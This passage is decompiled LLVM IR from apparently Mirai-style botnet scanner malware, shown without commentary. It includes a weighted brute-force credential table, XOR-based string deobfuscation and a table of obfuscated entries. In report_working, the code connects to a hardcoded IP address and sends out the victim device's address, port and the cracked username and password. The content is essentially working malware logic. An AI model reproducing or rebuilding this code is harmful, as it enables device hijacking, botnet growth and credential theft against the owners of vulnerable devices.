dec_label_pc_183fc:                               ; preds = %dec_label_pc_183c4
  br label %dec_label_pc_18404

dec_label_pc_18404:                               ; preds = %dec_label_pc_183b8, %dec_label_pc_183c4, %dec_label_pc_183fc
  %tmp_-24.1 = phi i32 [ -1, %dec_label_pc_183c4 ], [ %v8_183e4, %dec_label_pc_183fc ], [ %tmp_-24.0, %dec_label_pc_183b8 ]
  %v3_18408 = icmp eq i32 %tmp_-24.1, -1
  %storemerge3 = select i1 %v3_18408, i32 0, i32 %tmp_-24.1
  store i32 %v3_182e4, i32* @fp, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v8_183e4, { 1, 0 }
  uselistorder i32 %v1_18304, { 2, 0, 1 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 %conn, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18404, { 2, 1, 0 }
}

define i32 @consume_resp_prompt(i32 %conn) local_unnamed_addr {
entry:
  %tkn_resp_-28 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_18440 = load i32, i32* @fp, align 4
  store i32 99400, i32* %stack_var_-4, align 4
  %v2_18444 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_18444, i32* @fp, align 4
  call void @table_unlock_val(i8 26)
  %v2_18464 = bitcast i8** %tkn_resp_-28 to i32*
  %v3_18464 = call i8* @table_retrieve_val(i32 26, i32* %v2_18464)
  %v1_18474 = add i32 %conn, 28
  %v1_1847c = add i32 %conn, 24
  %v2_1847c = inttoptr i32 %v1_1847c to i32*
  %v3_1847c = load i32, i32* %v2_1847c, align 4
  %v3_18480 = load i8*, i8** %tkn_resp_-28, align 4
  %v4_18480 = ptrtoint i8* %v3_18480 to i32
  %v1_18484 = add i32 %v4_18480, -1
  %v1_18488 = inttoptr i32 %v1_18474 to i8*
  %v8_18490 = call i32 @util_memsearch(i8* %v1_18488, i32 %v3_1847c, i8* %v3_18464, i32 %v1_18484)
  %v7_18498 = icmp eq i32 %v8_18490, -1
  call void @table_lock_val(i8 26)
  br i1 %v7_18498, label %dec_label_pc_184b4, label %dec_label_pc_184a0

dec_label_pc_184a0:                               ; preds = %entry
  br label %dec_label_pc_18530

dec_label_pc_184b4:                               ; preds = %entry
  call void @table_unlock_val(i8 25)
  %v3_184d0 = call i8* @table_retrieve_val(i32 25, i32* %v2_18464)
  %v3_184e8 = load i32, i32* %v2_1847c, align 4
  %v3_184ec = load i8*, i8** %tkn_resp_-28, align 4
  %v4_184ec = ptrtoint i8* %v3_184ec to i32
  %v1_184f0 = add i32 %v4_184ec, -1
  %v9_184fc = call i32 @util_memsearch(i8* %v1_18488, i32 %v3_184e8, i8* %v3_184d0, i32 %v1_184f0)
  call void @table_lock_val(i8 25)
  %v4_18514 = icmp eq i32 %v9_184fc, -1
  br i1 %v4_18514, label %dec_label_pc_1851c, label %dec_label_pc_18528

dec_label_pc_1851c:                               ; preds = %dec_label_pc_184b4
  br label %dec_label_pc_18530

dec_label_pc_18528:                               ; preds = %dec_label_pc_184b4
  %v4_1852c = inttoptr i32 %v9_184fc to i8*
  br label %dec_label_pc_18530

dec_label_pc_18530:                               ; preds = %dec_label_pc_1851c, %dec_label_pc_184a0, %dec_label_pc_18528
  %v3_18530 = phi i8* [ null, %dec_label_pc_1851c ], [ inttoptr (i32 -1 to i8*), %dec_label_pc_184a0 ], [ %v4_1852c, %dec_label_pc_18528 ]
  %v4_18530 = ptrtoint i8* %v3_18530 to i32
  store i32 %v3_18440, i32* @fp, align 4
  ret i32 %v4_18530

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %tkn_resp_-28, { 1, 2, 0 }
  uselistorder i32 (i8*, i32, i8*, i32)* @util_memsearch, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 26, { 4, 0, 1, 2, 3 }
  uselistorder i32 %conn, { 1, 0 }
  uselistorder label %dec_label_pc_18530, { 2, 0, 1 }
}

define void @add_auth_entry(i8* %enc_user, i8* %enc_pass, i16 %weight) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i8* %enc_pass to i32
  store i32 %tmp3, i32* %r1.global-to-local, align 4
  %tmp_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_18548 = load i32, i32* @r4, align 4
  %v6_18548 = load i32, i32* @fp, align 4
  store i32 99664, i32* %stack_var_-4, align 4
  %v2_1854c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1854c, i32* @fp, align 4
  %v2_18568 = load i32, i32* @auth_table, align 4
  %v2_18570 = load i32, i32* @auth_table_len, align 4
  %tmp = mul i32 %v2_18570, 16
  %v3_18578 = add i32 %tmp, 16
  store i32 %v3_18578, i32* %r1.global-to-local, align 4
  %v2_18584 = inttoptr i32 %v2_18568 to i32*
  %v3_18584 = call i32 @realloc(i32* %v2_18584, i32 %v3_18578)
  store i32 %v3_18584, i32* @auth_table, align 4
  %v2_1859c = load i32, i32* @auth_table_len, align 4
  %v3_185a0 = mul i32 %v2_1859c, 16
  %v2_185b0 = add i32 %v3_185a0, %v3_18584
  store i32 %v2_185b0, i32* @r4, align 4
  %v2_185b4 = ptrtoint i32* %tmp_-28 to i32
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v7_185c0 = call i8* @deobf(i8* %enc_user, i32* nonnull %tmp_-28)
  %v9_185c0 = ptrtoint i8* %v7_185c0 to i32
  %v1_185c8 = load i32, i32* @r4, align 4
  %v2_185c8 = inttoptr i32 %v1_185c8 to i32*
  store i32 %v9_185c0, i32* %v2_185c8, align 4
  %v2_185d0 = load i32, i32* @auth_table_len, align 4
  %v3_185d4 = mul i32 %v2_185d0, 16
  %v2_185e0 = load i32, i32* @auth_table, align 4
  %v3_185e8 = load i32, i32* %tmp_-28, align 4
  %v1_185f0 = trunc i32 %v3_185e8 to i8
  %v2_185e4 = or i32 %v3_185d4, 12
  %v3_185f0 = add i32 %v2_185e4, %v2_185e0
  %v4_185f0 = inttoptr i32 %v3_185f0 to i8*
  store i8 %v1_185f0, i8* %v4_185f0, align 1
  %v2_185f8 = load i32, i32* @auth_table_len, align 4
  %v3_185fc = mul i32 %v2_185f8, 16
  %v2_18608 = load i32, i32* @auth_table, align 4
  %v2_1860c = add i32 %v2_18608, %v3_185fc
  store i32 %v2_1860c, i32* @r4, align 4
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v7_1861c = call i8* @deobf(i8* %enc_pass, i32* nonnull %tmp_-28)
  %v9_1861c = ptrtoint i8* %v7_1861c to i32
  %v1_18624 = load i32, i32* @r4, align 4
  %v2_18624 = add i32 %v1_18624, 4
  %v3_18624 = inttoptr i32 %v2_18624 to i32*
  store i32 %v9_1861c, i32* %v3_18624, align 4
  %v2_1862c = load i32, i32* @auth_table_len, align 4
  %v3_18630 = mul i32 %v2_1862c, 16
  %v2_1863c = load i32, i32* @auth_table, align 4
  %v3_18644 = load i32, i32* %tmp_-28, align 4
  %v1_1864c = trunc i32 %v3_18644 to i8
  %v2_18640 = or i32 %v3_18630, 13
  %v3_1864c = add i32 %v2_18640, %v2_1863c
  %v4_1864c = inttoptr i32 %v3_1864c to i8*
  store i8 %v1_1864c, i8* %v4_1864c, align 1
  %v2_18654 = load i32, i32* @auth_table_len, align 4
  %v3_18658 = mul i32 %v2_18654, 16
  %v2_18664 = load i32, i32* @auth_table, align 4
  %v2_18670 = load i16, i16* @auth_table_max_weight, align 2
  %v2_18668 = or i32 %v3_18658, 8
  %v3_18674 = add i32 %v2_18668, %v2_18664
  %v4_18674 = inttoptr i32 %v3_18674 to i16*
  store i16 %v2_18670, i16* %v4_18674, align 2
  %v2_1867c = load i32, i32* @auth_table_len, align 4
  store i32 %v2_1867c, i32* %r1.global-to-local, align 4
  %v3_18684 = mul i32 %v2_1867c, 16
  %v2_18690 = load i32, i32* @auth_table, align 4
  %v2_18694 = add i32 %v2_18690, %v3_18684
  %v2_1869c = load i16, i16* @auth_table_max_weight, align 2
  %v2_186a4 = add i16 %v2_1869c, %weight
  %v3_186b0 = add i32 %v2_18694, 10
  %v4_186b0 = inttoptr i32 %v3_186b0 to i16*
  store i16 %v2_186a4, i16* %v4_186b0, align 2
  %v0_186b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_186b4 = add i32 %v0_186b4, 1
  store i32 %v1_186b4, i32* @auth_table_len, align 4
  %v2_186c4 = load i16, i16* @auth_table_max_weight, align 2
  %v2_186cc = add i16 %v2_186c4, %weight
  store i16 %v2_186cc, i16* @auth_table_max_weight, align 2
  store i32 %v3_18548, i32* @r4, align 4
  store i32 %v6_18548, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %tmp_-28, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* (i8*, i32*)* @deobf, { 1, 0 }
}

define i32 @get_auth_entry(i32 %index) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_186f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_186f8, i32* @ip, align 4
  %v2_18710 = load i32, i32* @auth_table_len, align 4
  %v6_1871c = icmp sgt i32 %v2_18710, %index
  br i1 %v6_1871c, label %dec_label_pc_18720, label %dec_label_pc_18740

dec_label_pc_18720:                               ; preds = %entry
  %v3_18724 = mul i32 %index, 16
  %v2_18730 = load i32, i32* @auth_table, align 4
  %v2_18734 = add i32 %v2_18730, %v3_18724
  br label %dec_label_pc_18748

dec_label_pc_18740:                               ; preds = %entry
  br label %dec_label_pc_18748

dec_label_pc_18748:                               ; preds = %dec_label_pc_18720, %dec_label_pc_18740
  %storemerge = phi i32 [ 0, %dec_label_pc_18740 ], [ %v2_18734, %dec_label_pc_18720 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_18748, { 1, 0 }
}

define i32 @random_auth_entry() local_unnamed_addr {
entry:
  %v0_18774 = call i32 @rand_next()
  %v2_18780 = load i16, i16* @auth_table_max_weight, align 2
  %v3_18780 = zext i16 %v2_18780 to i32
  %v3_1878c = urem i32 %v0_18774, %v3_18780
  %v1_18794 = trunc i32 %v3_1878c to i16
  %v2_18824.pre = load i32, i32* @auth_table_len, align 4
  %v5_1883021 = icmp sgt i32 %v2_18824.pre, 0
  br i1 %v5_1883021, label %dec_label_pc_187a4.lr.ph, label %dec_label_pc_18834

dec_label_pc_187a4.lr.ph:                         ; preds = %entry
  %v2_187b4.pre = load i32, i32* @auth_table, align 4
  br label %dec_label_pc_187a4

dec_label_pc_187a4:                               ; preds = %dec_label_pc_187a4.lr.ph, %dec_label_pc_18814
  %storemerge422 = phi i32 [ 0, %dec_label_pc_187a4.lr.ph ], [ %v1_18818, %dec_label_pc_18814 ]
  %v3_187a8 = mul i32 %storemerge422, 16
  %v2_187b8 = add i32 %v2_187b4.pre, %v3_187a8
  %v1_187bc = add i32 %v2_187b8, 8
  %v2_187bc = inttoptr i32 %v1_187bc to i16*
  %v3_187bc = load i16, i16* %v2_187bc, align 2
  %v3_187c4 = icmp ult i16 %v1_18794, %v3_187bc
  br i1 %v3_187c4, label %dec_label_pc_18814, label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187a4
  %v1_187e4 = add i32 %v2_187b8, 10
  %v2_187e4 = inttoptr i32 %v1_187e4 to i16*
  %v3_187e4 = load i16, i16* %v2_187e4, align 2
  %v3_187ec = icmp ult i16 %v1_18794, %v3_187e4
  br i1 %v3_187ec, label %dec_label_pc_187f4, label %dec_label_pc_18814

dec_label_pc_187f4:                               ; preds = %dec_label_pc_187cc
  br label %dec_label_pc_1883c

dec_label_pc_18814:                               ; preds = %dec_label_pc_187cc, %dec_label_pc_187a4
  %v1_18818 = add nuw nsw i32 %storemerge422, 1
  %v5_18830 = icmp slt i32 %v1_18818, %v2_18824.pre
  br i1 %v5_18830, label %dec_label_pc_187a4, label %dec_label_pc_18834

dec_label_pc_18834:                               ; preds = %dec_label_pc_18814, %entry
  br label %dec_label_pc_1883c

dec_label_pc_1883c:                               ; preds = %dec_label_pc_187f4, %dec_label_pc_18834
  %storemerge = phi i32 [ %v2_187b8, %dec_label_pc_187f4 ], [ 0, %dec_label_pc_18834 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge422, { 1, 0 }
  uselistorder i32 %v2_18824.pre, { 1, 0 }
  uselistorder i32* @auth_table, { 0, 2, 3, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @auth_table_len, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i16* @auth_table_max_weight, { 1, 0, 2, 3, 4 }
  uselistorder i32 ()* @rand_next, { 73, 17, 16, 15, 14, 13, 72, 12, 19, 18, 9, 71, 70, 69, 65, 68, 67, 66, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 8, 7, 6, 5, 4, 3, 2, 11, 10, 1, 0 }
  uselistorder label %dec_label_pc_1883c, { 1, 0 }
  uselistorder label %dec_label_pc_187a4, { 1, 0 }
}

define void @report_working(i32 %daddr, i16 %dport, i32 %auth) local_unnamed_addr {
entry:
  %stack_var_-54 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %zero_-45 = alloca i8, align 1
  %addr_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_18860 = load i32, i32* @fp, align 4
  store i32 100456, i32* %stack_var_-4, align 4
  %v2_18864 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_18864, i32* @fp, align 4
  store i32 %daddr, i32* %stack_var_-52, align 4
  store i16 %dport, i16* %stack_var_-54, align 2
  %v0_1887c = call i32 @__libc_fork()
  %v5_18898 = icmp sgt i32 %v0_1887c, 0
  br i1 %v5_18898, label %dec_label_pc_18a28, label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %entry
  %v3_188a0 = icmp eq i32 %v0_1887c, -1
  br i1 %v3_188a0, label %dec_label_pc_18a28, label %dec_label_pc_188ac

dec_label_pc_188ac:                               ; preds = %dec_label_pc_1889c
  %v3_188b8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_188c8 = icmp eq i32 %v3_188b8, -1
  br i1 %v3_188c8, label %dec_label_pc_188d0, label %dec_label_pc_188d8

dec_label_pc_188d0:                               ; preds = %dec_label_pc_188ac
  %v1_188d4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_188d8

dec_label_pc_188d8:                               ; preds = %dec_label_pc_188ac, %dec_label_pc_188d0
  store i32 2, i32* %addr_-44, align 4
  %v1_188e4 = call i32 @__GI_htonl(i32 -1178808733)
  call void @table_unlock_val(i8 19)
  %v3_18900 = call i8* @table_retrieve_val(i32 19, i32* null)
  call void @table_lock_val(i8 19)
  %v2_18918 = ptrtoint i32* %addr_-44 to i32
  %v3_18928 = call i32 @__libc_connect(i32 %v3_188b8, i32 %v2_18918, i32 16)
  %v3_18930 = icmp eq i32 %v3_18928, -1
  br i1 %v3_18930, label %dec_label_pc_18938, label %dec_label_pc_18948

dec_label_pc_18938:                               ; preds = %dec_label_pc_188d8
  %v1_1893c = call i32 @__GI___libc_close(i32 %v3_188b8)
  %v1_18944 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_188d8, %dec_label_pc_18938
  store i8 0, i8* %zero_-45, align 1
  %v2_18950 = ptrtoint i8* %zero_-45 to i32
  %v5_18964 = call i32 @__libc_send(i32 %v3_188b8, i32 %v2_18950, i32 1, i32 16384)
  %v2_18968 = ptrtoint i32* %stack_var_-52 to i32
  %v4_1897c = call i32 @__libc_send(i32 %v3_188b8, i32 %v2_18968, i32 4, i32 16384)
  %v2_18980 = ptrtoint i16* %stack_var_-54 to i32
  %v4_18994 = call i32 @__libc_send(i32 %v3_188b8, i32 %v2_18980, i32 2, i32 16384)
  %v1_1899c = add i32 %auth, 12
  %v4_189b0 = call i32 @__libc_send(i32 %v3_188b8, i32 %v1_1899c, i32 1, i32 16384)
  %v1_189b8 = inttoptr i32 %auth to i32*
  %v2_189b8 = load i32, i32* %v1_189b8, align 4
  %v2_189c0 = inttoptr i32 %v1_1899c to i8*
  %v3_189c0 = load i8, i8* %v2_189c0, align 1
  %v4_189c0 = zext i8 %v3_189c0 to i32
  %v4_189d4 = call i32 @__libc_send(i32 %v3_188b8, i32 %v2_189b8, i32 %v4_189c0, i32 16384)
  %v1_189dc = add i32 %auth, 13
  %v4_189f0 = call i32 @__libc_send(i32 %v3_188b8, i32 %v1_189dc, i32 1, i32 16384)
  %v1_189f8 = add i32 %auth, 4
  %v2_189f8 = inttoptr i32 %v1_189f8 to i32*
  %v3_189f8 = load i32, i32* %v2_189f8, align 4
  %v2_18a00 = inttoptr i32 %v1_189dc to i8*
  %v3_18a00 = load i8, i8* %v2_18a00, align 1
  %v4_18a00 = zext i8 %v3_18a00 to i32
  %v4_18a14 = call i32 @__libc_send(i32 %v3_188b8, i32 %v3_189f8, i32 %v4_18a00, i32 16384)
  %v1_18a1c = call i32 @__GI___libc_close(i32 %v3_188b8)
  %v1_18a24 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18a28

dec_label_pc_18a28:                               ; preds = %dec_label_pc_1889c, %entry, %dec_label_pc_18948
  store i32 %v3_18860, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %addr_-44, { 1, 0 }
  uselistorder i8* %zero_-45, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder void (i8)* @table_lock_val, { 33, 32, 31, 48, 47, 46, 45, 44, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 43, 42, 41, 40, 39, 3, 2, 1, 0, 38, 37, 36, 35, 34 }
  uselistorder i8* (i32, i32*)* @table_retrieve_val, { 56, 55, 54, 71, 70, 69, 68, 67, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 66, 65, 64, 63, 62, 22, 21, 20, 19, 18, 17, 15, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 61, 60, 59, 58, 57 }
  uselistorder void (i8)* @table_unlock_val, { 42, 41, 40, 57, 56, 55, 54, 53, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 52, 51, 50, 49, 48, 14, 13, 12, 11, 47, 46, 45, 44, 43, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ()* @__libc_fork, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_18a28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18948, { 1, 0 }
  uselistorder label %dec_label_pc_188d8, { 1, 0 }
}

define i8* @deobf(i8* %str, i32* %len) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %len to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_18a3c = load i32, i32* @fp, align 4
  store i32 100932, i32* %stack_var_-4, align 4
  %v2_18a40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_18a40, i32* @fp, align 4
  store i32 %tmp, i32* %stack_var_-32, align 4
  %v3_18a54 = call i32 @util_strlen(i8* %str)
  store i32 %v3_18a54, i32* %len, align 4
  %v1_18a6c = add i32 %v3_18a54, 1
  %v1_18a74 = call i32 @malloc(i32 %v1_18a6c)
  %v4_18a7c = inttoptr i32 %v1_18a74 to i8*
  %v2_18a84 = load i32, i32* %len, align 4
  %v1_18a88 = add i32 %v2_18a84, 1
  call void @util_memcpy(i8* %v4_18a7c, i8* %str, i32 %v1_18a88)
  br label %dec_label_pc_18b84

dec_label_pc_18aa8:                               ; preds = %dec_label_pc_18b84
  %v2_18ab4 = add i32 %v4_18b8c, %v1_18a74
  %v1_18ac8 = inttoptr i32 %v2_18ab4 to i8*
  %v2_18ac8 = load i8, i8* %v1_18ac8, align 1
  %v2_18b6c = xor i8 %v2_18ac8, 34
  store i8 %v2_18b6c, i8* %v1_18ac8, align 1
  %v1_18b7c = add i32 %v4_18b8c, 1
  %v4_18b80 = inttoptr i32 %v1_18b7c to i8*
  br label %dec_label_pc_18b84

dec_label_pc_18b84:                               ; preds = %entry, %dec_label_pc_18aa8
  %storemerge = phi i8* [ %v4_18b80, %dec_label_pc_18aa8 ], [ null, %entry ]
  %v3_18b84 = load i32, i32* %stack_var_-32, align 4
  %v1_18b88 = inttoptr i32 %v3_18b84 to i32*
  %v2_18b88 = load i32, i32* %v1_18b88, align 4
  %v4_18b8c = ptrtoint i8* %storemerge to i32
  %v8_18b94 = icmp sgt i32 %v2_18b88, %v4_18b8c
  br i1 %v8_18b94, label %dec_label_pc_18aa8, label %dec_label_pc_18b98

dec_label_pc_18b98:                               ; preds = %dec_label_pc_18b84
  store i32 %v3_18a3c, i32* @fp, align 4
  ret i8* %v4_18a7c

; uselistorder directives
  uselistorder i32 %v4_18b8c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_18b84, { 1, 0 }
}

define i8 @can_consume(i32 %conn, i8* %ptr, i32 %amount) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %ptr to i32
  %stack_var_0 = alloca i32, align 4
  %v1_18bac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_18bac, i32* @ip, align 4
  %v1_18bcc = add i32 %conn, 28
  %v1_18bd8 = add i32 %conn, 24
  %v2_18bd8 = inttoptr i32 %v1_18bd8 to i32*
  %v3_18bd8 = load i32, i32* %v2_18bd8, align 4
  %v2_18bdc = add i32 %v3_18bd8, %v1_18bcc
  %v2_18bf0 = add i32 %tmp, %amount
  %v3_18bf8 = icmp ult i32 %v2_18bf0, %v2_18bdc
  %v1_18c04 = zext i1 %v3_18bf8 to i8
  ret i8 %v1_18c04
}

define void @table_init() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 101408, i32* %stack_var_-4, align 4
  %v2_18c1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_18c1c, i32* @fp, align 4
  call void @add_entry(i8 4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2309c.312, i32 0, i32 0), i32 2)
  call void @add_entry(i8 19, i8* bitcast (i8** @global_var_230a0.314 to i8*), i32 2)
  call void @add_entry(i8 2, i8* bitcast (i8** @global_var_230a4.316 to i8*), i32 15)
  call void @add_entry(i8 5, i8* bitcast (i8** @global_var_230b4.318 to i8*), i32 29)
  call void @add_entry(i8 6, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_230d4.320, i32 0, i32 0), i32 7)
  call void @add_entry(i8 7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_230dc.322, i32 0, i32 0), i32 5)
  call void @add_entry(i8 8, i8* bitcast (i8** @global_var_230e4.324 to i8*), i32 11)
  call void @add_entry(i8 9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_230f0.326, i32 0, i32 0), i32 4)
  call void @add_entry(i8 10, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_230f8.328, i32 0, i32 0), i32 7)
  call void @add_entry(i8 11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23100.330, i32 0, i32 0), i32 8)
  call void @add_entry(i8 12, i8* bitcast (i8** @global_var_2310c.332 to i8*), i32 13)
  call void @add_entry(i8 13, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2311c.334, i32 0, i32 0), i32 10)
  call void @add_entry(i8 14, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_23128.336, i32 0, i32 0), i32 10)
  call void @add_entry(i8 15, i8* bitcast (i8** @global_var_23134.338 to i8*), i32 33)
  call void @add_entry(i8 16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23158.340, i32 0, i32 0), i32 8)
  call void @add_entry(i8 17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23164.342, i32 0, i32 0), i32 11)
  call void @add_entry(i8 20, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23170.344, i32 0, i32 0), i32 6)
  call void @add_entry(i8 21, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23178.346, i32 0, i32 0), i32 7)
  call void @add_entry(i8 22, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23180.348, i32 0, i32 0), i32 7)
  call void @add_entry(i8 23, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_23188.350, i32 0, i32 0), i32 3)
  call void @add_entry(i8 24, i8* bitcast (i8** @global_var_2318c.352 to i8*), i32 19)
  call void @add_entry(i8 25, i8* bitcast (i8** @global_var_231a0.354 to i8*), i32 24)
  call void @add_entry(i8 26, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_231bc.356, i32 0, i32 0), i32 9)
  call void @add_entry(i8 27, i8* bitcast (i8** @global_var_231c8.358 to i8*), i32 16)
  call void @add_entry(i8 28, i8* bitcast (i8** @global_var_231dc.360 to i8*), i32 22)
  call void @add_entry(i8 29, i8* bitcast (i8** @global_var_231f4.362 to i8*), i32 21)
  call void @add_entry(i8 30, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_2320c.364, i32 0, i32 0), i32 17)
  call void @add_entry(i8 31, i8* bitcast (i8** @global_var_23220.366 to i8*), i32 12)
  call void @add_entry(i8 32, i8* bitcast (i8** @global_var_23230.368 to i8*), i32 23)
  call void @add_entry(i8 33, i8* bitcast (i8** @global_var_23248.370 to i8*), i32 83)
  call void @add_entry(i8 34, i8* bitcast (i8** @global_var_2329c.372 to i8*), i32 32)
  call void @add_entry(i8 35, i8* bitcast (i8** @global_var_232c0.374 to i8*), i32 48)
  call void @add_entry(i8 36, i8* bitcast (i8** @global_var_232f4.376 to i8*), i32 12)
  call void @add_entry(i8 37, i8* bitcast (i8** @global_var_23304.378 to i8*), i32 9)
  call void @add_entry(i8 38, i8* bitcast (i8** @global_var_23310.380 to i8*), i32 10)
  call void @add_entry(i8 39, i8* bitcast (i8** @global_var_2331c.382 to i8*), i32 12)
  call void @add_entry(i8 40, i8* bitcast (i8** @global_var_2332c.384 to i8*), i32 16)
  call void @add_entry(i8 41, i8* bitcast (i8** @global_var_23340.386 to i8*), i32 19)
  call void @add_entry(i8 42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23354.388, i32 0, i32 0), i32 8)
  call void @add_entry(i8 43, i8* bitcast (i8** @global_var_23360.390 to i8*), i32 11)
  call void @add_entry(i8 44, i8* bitcast (i8** @global_var_2336c.392 to i8*), i32 12)
  call void @add_entry(i8 45, i8* bitcast (i8** @global_var_2337c.394 to i8*), i32 18)
  call void @add_entry(i8 46, i8* bitcast (i8** @global_var_23390.396 to i8*), i32 25)
  call void @add_entry(i8 47, i8* bitcast (i8** @global_var_233ac.398 to i8*), i32 111)
  call void @add_entry(i8 48, i8* bitcast (i8** @global_var_2341c.400 to i8*), i32 111)
  call void @add_entry(i8 49, i8* bitcast (i8** @global_var_2348c.402 to i8*), i32 110)
  call void @add_entry(i8 50, i8* bitcast (i8** @global_var_234fc.404 to i8*), i32 110)
  call void @add_entry(i8 51, i8* bitcast (i8** @global_var_2356c.406 to i8*), i32 117)
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 47, { 0, 1, 2, 3, 4, 9, 10, 11, 12, 5, 6, 7, 8 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i8 34, { 1, 0, 2, 3, 6, 7, 4, 5 }
  uselistorder i32 23, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i8 31, { 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 17, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i8 16, { 7, 0, 8, 1, 3, 9, 10, 4, 2, 11, 5, 12, 6, 13 }
  uselistorder i8 8, { 1, 2, 0, 3, 6, 4, 5, 7, 8 }
  uselistorder i8 7, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 19, 23 }
  uselistorder i8 6, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 21, 22, 20, 23, 24, 25, 28, 26, 27 }
  uselistorder i8 2, { 5, 3, 0, 1, 6, 7, 8, 9, 10, 4, 2, 11, 12, 13, 14, 15, 16, 17, 18, 21, 19, 20, 22, 23 }
  uselistorder i8 19, { 1, 2, 3, 0, 4, 5 }
